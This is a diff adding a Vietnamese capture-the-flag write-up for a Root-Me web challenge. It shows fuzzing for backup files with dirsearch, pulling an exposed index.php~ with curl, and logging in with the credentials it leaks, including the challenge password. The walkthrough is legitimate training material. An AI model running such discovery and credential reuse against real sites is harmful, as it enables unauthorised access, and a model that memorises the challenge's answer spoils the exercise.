@@ -162,3 +162,43 @@ Thông thường, chúng ta có thể xem thông tin người dùng theo id nên
 Thành công, chúng ta đã xem được note chứa flag của người dùng `admin`.
 
 ![image](images/api-broken-access/image-6.png)
+
+## Backup file
+
+> No clue.
+
+Thử thách này yêu cầu chúng ta đăng nhập nhưng chúng ta đâu có biết thông tin đăng nhập.
+
+![image](images/backup-file/image-1.png)
+
+Với tên thử thách liên quan đến backup file, có thể nghĩ đến việc đọc các file này để tìm được các thông tin hữu ích.
+
+Chúng ta sẽ sử dụng công cụ [dirsearch](https://github.com/maurosoria/dirsearch) với wordlist [backup_files_only.txt](https://github.com/xajkep/wordlists/blob/master/discovery/backup_files_only.txt) để thực hiện fuzz tìm file backup.
+
+```bash
+python3 dirsearch.py -w ~/wordlists/backup_files_only.txt -u http://challenge01.root-me.org/web-serveur/ch11/
+```
+
+Sau khi thực hiện lệnh trên, chúng ta nhận thấy server có một file `index.php~`.
+
+```text
+[11:23:48] 200 -   843B - /web-serveur/ch11/index.php~                      
+```
+
+Tiếp theo, chúng ta sẽ lấy nội dung của file đó bằng lệnh `curl`.
+
+```bash
+curl http://challenge01.root-me.org/web-serveur/ch11/index.php~
+```
+
+```php
+<?php
+
+$username="ch11";
+$password="OCCY9AcNm1tj";
+...
+```
+
+Có được username cùng với password, chúng ta có thể đăng nhập thành công.
+
+![image](images/backup-file/image-2.png)
